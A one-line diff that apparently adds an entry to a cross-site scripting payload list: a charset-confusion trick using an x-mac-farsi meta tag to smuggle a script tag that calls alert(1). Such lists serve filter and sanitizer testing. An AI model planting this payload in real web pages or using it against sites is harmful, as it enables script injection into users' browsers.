@@ -1,0 +1,1 @@
+x-mac-farsi exploit: &lt;meta charset=&quot;x-mac-farsi&quot;&gt;?script ?alert(1)//?/script ?
